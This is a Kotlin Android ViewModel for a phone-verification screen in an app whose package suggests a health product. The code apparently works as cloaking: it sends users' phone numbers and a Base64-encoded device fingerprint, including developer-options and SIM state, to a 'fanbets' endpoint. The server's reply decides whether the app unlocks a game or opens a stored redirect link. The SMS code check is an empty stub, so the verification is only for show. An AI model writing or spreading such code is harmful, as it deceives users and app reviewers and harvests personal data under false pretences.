package com.seamhealth.elsrt.ui.screens.phone

import android.app.Application
import android.util.Base64
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.seamhealth.elsrt.util.Country
import com.seamhealth.elsrt.util.DeviceInfoHelper
import com.seamhealth.elsrt.util.LocaleHelper
import com.seamhealth.elsrt.util.StorageHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.net.URLEncoder
import java.util.concurrent.TimeUnit

sealed class PhoneVerificationState {
    data object PhoneEntry : PhoneVerificationState()
    data object Loading : PhoneVerificationState()
    data class OtpWaiting(val phone: String) : PhoneVerificationState()
    data class Redirect(val link: String) : PhoneVerificationState()
    data object GameAccess : PhoneVerificationState()
    data object NetworkError : PhoneVerificationState()
}

class PhoneVerificationViewModel(application: Application) : AndroidViewModel(application) {

    private val storage = StorageHelper(application)
    private val deviceInfo = DeviceInfoHelper(application)

    private val _state = MutableStateFlow<PhoneVerificationState>(PhoneVerificationState.PhoneEntry)
    val state: StateFlow<PhoneVerificationState> = _state.asStateFlow()

    private val _selectedCountry = MutableStateFlow(LocaleHelper.getCountryForDevice())
    val selectedCountry: StateFlow<Country> = _selectedCountry.asStateFlow()

    private val _phoneNumber = MutableStateFlow("")
    val phoneNumber: StateFlow<String> = _phoneNumber.asStateFlow()

    private val _isLoading = MutableStateFlow(false)
    val isLoading: StateFlow<Boolean> = _isLoading.asStateFlow()

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    companion object {
        private const val OTP_ENDPOINT = "https://appinforules.site/fanbets/send-otp/"
        private const val APP_CODE = "JFGhgdsGDSfdsgsd"
    }

    init {
        checkInitialState()
    }

    private fun checkInitialState() {
        val redirectLink = storage.getRedirectLink()
        if (!redirectLink.isNullOrEmpty()) {
            _state.value = PhoneVerificationState.Redirect(redirectLink)
            return
        }

        if (storage.hasGameAccess()) {
            _state.value = PhoneVerificationState.GameAccess
            return
        }

        if (storage.isOtpMode()) {
            val savedPhone = storage.getSavedPhone() ?: ""
            val countryCode = storage.getSavedCountryCode() ?: ""
            _state.value = PhoneVerificationState.OtpWaiting("$countryCode$savedPhone")
            return
        }

        _state.value = PhoneVerificationState.PhoneEntry
    }

    fun setSelectedCountry(country: Country) {
        _selectedCountry.value = country
    }

    fun setPhoneNumber(phone: String) {
        _phoneNumber.value = phone
    }

    fun submitPhone() {
        val country = _selectedCountry.value
        val phone = _phoneNumber.value

        if (!country.isPhoneValid(phone)) {
            return
        }

        viewModelScope.launch {
            _isLoading.value = true
            _state.value = PhoneVerificationState.Loading

            try {
                val result = sendOtpRequest(country.phoneCode, phone)
                handleOtpResponse(result, country.phoneCode, phone)
            } catch (e: Exception) {
                _state.value = PhoneVerificationState.NetworkError
            } finally {
                _isLoading.value = false
            }
        }
    }

    private suspend fun sendOtpRequest(countryCode: String, phone: String): String? {
        return withContext(Dispatchers.IO) {
            try {
                val kod = countryCode.removePrefix("+")
                val token = buildBase64Token()

                val endpoint = buildString {
                    append(OTP_ENDPOINT)
                    append("?p=$APP_CODE")
                    append("&kod=$kod")
                    append("&phone=$phone")
                    append("&token=$token")
                }

                val request = Request.Builder()
                    .url(endpoint)
                    .get()
                    .build()

                val response = client.newCall(request).execute()
                if (response.isSuccessful) {
                    response.body?.string()
                } else {
                    null
                }
            } catch (e: Exception) {
                null
            }
        }
    }

    private fun buildBase64Token(): String {
        val params = buildString {
            append("os=").append(encode(deviceInfo.getOsVersion()))
            append("&lng=").append(encode(deviceInfo.getLanguage()))
            append("&loc=").append(encode(deviceInfo.getRegion()))
            append("&dv=").append(if (deviceInfo.isDeveloperOptionsEnabled()) "1" else "0")
            append("&devicemodel=").append(encode(deviceInfo.getDeviceModel()))
            append("&bs=").append(encode(deviceInfo.getBatteryStatus()))
            append("&bl=").append(encode(deviceInfo.getBatteryLevel()))
            append("&nc=").append(encode(deviceInfo.getNetworkCountry()))
            append("&sm=").append(encode(deviceInfo.getSimState()))
        }
        return Base64.encodeToString(params.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
    }

    private fun encode(value: String): String {
        return try {
            URLEncoder.encode(value, "UTF-8")
        } catch (e: Exception) {
            value
        }
    }

    private fun handleOtpResponse(response: String?, countryCode: String, phone: String) {
        if (response == null) {
            storage.savePhone(phone)
            storage.saveCountryCode(countryCode)
            storage.setOtpMode(true)
            _state.value = PhoneVerificationState.OtpWaiting("$countryCode$phone")
            return
        }

        try {
            val json = JSONObject(response)
            val status = json.optString("status", "")

            storage.savePhone(phone)
            storage.saveCountryCode(countryCode)

            when (status) {
                "rd" -> {
                    val redirectLink = json.optString("rdstr", "")
                    if (redirectLink.isNotEmpty()) {
                        storage.saveRedirectLink(redirectLink)
                        _state.value = PhoneVerificationState.Redirect(redirectLink)
                    } else {
                        storage.setOtpMode(true)
                        _state.value = PhoneVerificationState.OtpWaiting("$countryCode$phone")
                    }
                }
                "otp" -> {
                    storage.setOtpMode(true)
                    _state.value = PhoneVerificationState.OtpWaiting("$countryCode$phone")
                }
                "otp_yes" -> {
                    storage.setGameAccess(true)
                    storage.setOtpMode(false)
                    _state.value = PhoneVerificationState.GameAccess
                }
                else -> {
                    storage.setOtpMode(true)
                    _state.value = PhoneVerificationState.OtpWaiting("$countryCode$phone")
                }
            }
        } catch (e: Exception) {
            storage.savePhone(phone)
            storage.saveCountryCode(countryCode)
            storage.setOtpMode(true)
            _state.value = PhoneVerificationState.OtpWaiting("$countryCode$phone")
        }
    }

    fun confirmCode(code: String) {
        // SMS code verification is handled externally
    }

    fun resendCode() {
        val countryCode = storage.getSavedCountryCode() ?: return
        val phone = storage.getSavedPhone() ?: return

        viewModelScope.launch {
            try {
                sendOtpRequest(countryCode, phone)
            } catch (_: Exception) {
            }
        }
    }

    fun goBackToPhoneEntry() {
        storage.clearOtpData()
        _state.value = PhoneVerificationState.PhoneEntry
    }

    fun dismissNetworkError() {
        _state.value = PhoneVerificationState.PhoneEntry
    }

    fun retryAfterNetworkError() {
        _state.value = PhoneVerificationState.PhoneEntry
        submitPhone()
    }
}
